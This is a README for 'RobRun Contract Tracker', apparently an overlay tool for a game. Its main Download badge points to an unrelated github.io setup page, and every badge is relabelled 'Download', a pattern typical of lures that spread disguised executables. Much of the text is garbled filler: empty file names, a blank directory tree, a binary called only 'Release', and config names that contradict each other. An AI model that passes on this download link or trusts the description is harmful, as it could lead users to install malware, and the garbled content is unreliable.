Guide:

# RobRun-Contract-Tracker

<p align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-7c3aed?style=for-the-badge&logo=nuget&logoColor=white" alt="Download">
  </a>
  <a href="https://github.com/gigahokagepincers/RobRun-Contract-Tracker">
    <img src="https://img.shields.io/badge/Download-5e5e5e?style=flat-square&logo=github&logoColor=white" alt="Repository">
  </a>
  <a href="https://github.com/gigahokagepincers/RobRun-Contract-Tracker/releases">
    <img src="https://img.shields.io/badge/Download-2bbc8a?style=plastic&logo=tag&logoColor=white" alt="Version">
  </a>
  <a href="https://github.com/gigahokagepincers/RobRun-Contract-Tracker/blob/main/LICENSE">
    <img src="https://img.shields.io/badge/Download-ff69b4?style=flat&logo=unlicense&logoColor=white" alt="License">
  </a>
  <a href="https://dotnet.microsoft.com/">
    <img src="https://img.shields.io/badge/Download-8250df?style=for-the-badge&logo=dotnet&logoColor=white" alt=".NET">
  </a>
  <a href="https://github.com/gigahokagepincers/RobRun-Contract-Tracker/issues">
    <img src="https://img.shields.io/badge/Download-7289da?style=flat-square&logo=discord&logoColor=white" alt="Support">
  </a>
</p>

---

## What is RobRun Contract Tracker?

RobRun‑Contract‑Tracker is a companion application designed for the **RobRun** ecosystem. It consolidates contract data, applies user‑defined workflow presets, and delivers a ready‑to‑run release bundle. By loading structured configuration profiles, the tracker keeps your contract progress synchronized across sessions, highlights overdue milestones, and provides a clean visual overlay for quick status checks. All assets are self‑contained; no external services are required after the initial download.

---

## Core Features

- **Profile‑Driven Configuration** – Choose from ``, ``, ``, or craft a `` to match your playstyle. Each file follows a predictable INI‑style syntax, enabling rapid edits without recompilation.
- **Workflow Presets** – Over 20 built‑in presets map common contract routes (e.g., “Speed Run”, “Stealth Capture”, “Resource Hoarding”). Presets are stored in `presets/` and can be activated with a single click inside the UI.
- **Live Release Bundle** – The latest compiled binary, resource icons, and localized strings are shipped together, ensuring version parity between the tracker and the base game.
- **Cross‑Platform Rendering** – Rendered with .NET 6 and the SkiaSharp graphics engine, the tracker runs on Windows, Linux, and macOS without platform‑specific code.
- **Export & Import** – Export your current session to `session.json` for sharing, or import a teammate’s file to resume exactly where they left off.

---

## Getting Started

1. **Download** – Click the *Download* badge above. The zip archive contains the executable, the `configs/` folder, and a `presets/` directory.
2. **Extract** – Unzip the archive into a location of your choice. The folder structure must remain unchanged for the tracker to locate its resources.
3. **Select a Profile** – Open `configs/` with any text editor. Adjust the `RefreshRate`, `OverlayOpacity`, and `HighlightColor` keys to suit your visual preferences. Save the file.
4. **Activate a Preset** – Launch `Release`. In the main window, click the **Presets** dropdown and choose “Speed Run”. The tracker will automatically load the associated workflow file from `presets/`.
5. **Start Tracking** – Return to the game, open the contract screen, and press **F9** (default hotkey) to toggle the overlay. The tracker will begin monitoring contract timers and display a concise progress bar in the top‑right corner.

> **Tip:** If you prefer a different hotkey, edit the `HotkeyToggle` entry in `` and restart the application.

---

## Directory Layout

    RobRun-Contract-Tracker/
    ├─ bin/
    │  └─ Release
    ├─ configs/
    │  ├─
    │  ├─
    │  ├─
    │  └─
    ├─ presets/
    │  ├─
    │  ├─
    │  └─
    ├─ resources/
    │  ├─ icons/
    │  └─ locales/
    └─ README.md

The `bin/` folder holds the compiled binary. `resources/` contains PNG icons used by the overlay and localisation files for English, Japanese, and German. Keeping this layout intact guarantees that the tracker resolves assets at runtime.

---

## FAQ & Troubleshooting

**Q: The overlay does not appear after pressing the hotkey.**
A: Verify that `configs/` contains the correct `HotkeyToggle` entry and that the key is not bound elsewhere in the game. Restart the tracker after any edit.

**Q: I see “Missing preset file” in the console window.**
A: Ensure the selected preset exists in `presets/`. Preset names are case‑sensitive; rename the file or adjust the selection accordingly.

**Q: The tracker crashes on startup on Linux.**
A: Confirm that the `libSkiaSharp.so` dependency is present. The release bundle includes it; if you moved files manually, copy the `libSkiaSharp.so` from `resources/` back into `bin/`.

**Q: Can I run multiple instances for different contracts?**
A: Yes. Launch the executable with the `--config ` argument (passed via a shortcut) to load an independent configuration set.

**Q: Where are my exported sessions stored?**
A: Exported files are written to the `sessions/` directory at the root of the repository. Import by dragging the JSON file onto the tracker window or using the **Import** button.

---

## Contributing & Feedback

The project is maintained by **gigahokagepincers**. Contributions that add new presets, improve visual themes, or fix platform‑specific quirks are welcomed. Submit a pull request with a clear description of the change and, if applicable, an updated `README` section. For quick questions, join the Discord community linked in the badge row.

---

Enjoy a smoother contract‑management experience with **RobRun Contract Tracker**—your personal companion for staying on top of every objective.

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```